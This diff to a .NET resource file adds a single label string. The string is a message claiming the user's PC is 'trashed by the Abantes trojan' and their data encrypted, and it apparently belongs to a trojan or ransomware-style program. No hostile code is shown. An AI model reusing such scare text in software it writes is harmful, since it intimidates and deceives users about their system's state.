@@ -117,4 +117,13 @@
   <resheader name="writer">
     <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </resheader>
+  <data name="label2.Text" xml:space="preserve">
+    <value>YOUR PC IS TRASHED BY THE ABANTES TROJAN
+DON'T EVEN TRY TO CONTINUE WITH FIXING THIS PC
+EVEN IF YOU FIX THIS PC YOUR DATA IS ENCRYPTED
+
+
+NOTE: IF YOU ARE TRYING TO FIX
+THIS PC THERE'S A LONG WAY TO GO</value>
+  </data>
 </root>
